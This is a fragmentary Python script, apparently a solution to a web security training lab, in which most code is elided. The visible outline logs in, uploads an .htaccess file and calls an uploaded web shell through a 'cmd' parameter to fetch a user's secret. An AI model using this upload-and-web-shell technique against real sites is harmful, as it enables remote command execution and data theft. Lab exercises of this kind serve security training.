...
def is_upload_htaccess_successful(url, session):
...
def get_carlos_secret(url, session):
    cmd_url = (
        url + '/files/avatars/webshell.test?cmd=' + 
...
if __name__ == "__main__":
    try:
        ...
        if not is_login_successful(url, session):
            ...
            sys.exit(FAIL)
        if not is_upload_htaccess_successful(url, session):
            print("[-] Upload of htaccess was not successful")
            sys.exit(FAIL)
